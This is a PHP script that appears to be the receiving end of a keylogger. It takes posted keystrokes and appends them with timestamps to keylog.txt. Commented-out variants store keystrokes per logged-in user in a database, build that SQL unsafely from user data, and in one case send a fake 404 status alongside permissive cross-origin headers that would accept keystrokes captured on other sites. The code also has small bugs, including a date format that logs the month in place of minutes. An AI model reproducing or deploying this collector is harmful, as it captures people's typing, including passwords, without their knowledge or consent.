<?php
    require_once "../authenticate/config.php";
    session_start();
	$conn = mysqli_connect($hostname, $username, $password,$database);
	// Check connection
	if (!$conn) {
	  die("Connection failed: " . mysqli_connect_error());
	}
// (A) OPEN KEYLOG FILE, APPEND MODE
// $user = $_SESSION['user'];
// $dir = "../user_images/'.$user.'/'";
// $file = fopen("'$dir'.keylog.txt", "a+");
$file = fopen("keylog.txt", "a+");


// (B) SAVE KEYSTROKES
$keys = json_decode($_POST['keys']);
foreach ($keys as $k=>$v)
{ fwrite($file,date("Y-m-d H:m:i").":". $v.PHP_EOL); }

// Updating to SQL DATABASE
    // $date = date('h:i:sa');
    // $create_log_table_query = "CREATE TABLE Log (date_ DATE NOT NULL, User VARCHAR(30) NOT NULL, Keypressed VARCHAR(100) NOT NULL)";
    // $create_log_table_result = mysqli_query($conn, $create_user_table_query)
    // if(!$create_log_table_result)
    //     echo "There was some problem creating table for {$user}.<br>".mysqli_error($conn);

    // if(!file_exists("../user_images/{$user}")) {
    //     mkdir("../user_images/{$user}",0777,true);
    // }

    // $insert_image_query = "INSERT INTO Log VALUE('{$date}','{$user}','{$keys}')";
    // $result = mysqli_query($conn, $insert_image_query);

// (C) CLOSE & END
fclose($file);
echo "LOGGED";
?>

<!-- <?php
    // require_once "../authenticate/login.php";
    // session_start();
    // $conn = mysqli_connect($hostname, $username, $password, $database);
    // if(!$conn)
    //     die("Error while connecting. Try later. <br>".mysqli_connect_error());

    // $result = $_GET['click'];


    // if(!empty($_GET['c'])) {
    //     $logfile = fopen($dir + 'log.txt', 'a+');
    //     fwrite($logfile, $_GET['c']);
    //     fclose($logfile);
    }
?> -->

<!-- <?php
	// require_once "config.php";
    // header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
	// header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
	// header('Access-Control-Allow-Credentials: true');
	// header('Access-Control-Allow-Origin: *');
	// header('Access-Control-Allow-Headers: Content-Type, *');
    // session_start();
	// $conn = mysqli_connect($hostname, $username, $password,$database);
	// // Check connection
	// if (!$conn) {
	//   die("Connection failed: " . mysqli_connect_error());
	// }

	// $file = 'data.txt';

	// if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
	// {
	// $result = $_REQUEST['c'];
	// echo $result;
    // $user = $_SESSION['user'];
    // $dir = 'user_images/'.$user.'/';
    // $date = date('h:i:sa');
    // $create_log_table_query = "CREATE TABLE Log (date_ DATE NOT NULL, User VARCHAR(30) NOT NULL, Keypressed VARCHAR(30) NOT NULL)";
    // $create_log_table_result = mysqli_query($conn, $create_log_table_query);
    // if(!$create_log_table_result)
    //     echo "There was some problem creating table for {$user}.<br>".mysqli_error($conn);

    // if(!file_exists("user_images/{$user}")) {
    //     mkdir("user_images/{$user}",0777,true);
    // }

    // $insert_image_query = "INSERT INTO Log VALUE('{$date}','{$user}','{$result}'}')";
    // $result = mysqli_query($conn, $insert_image_query);

    // file_put_contents($file, date("Y-m-d H:m:i"). " : " . $_REQUEST['c']."\n", FILE_APPEND);
    // printf("LOGGED!");
	// }
?>  -->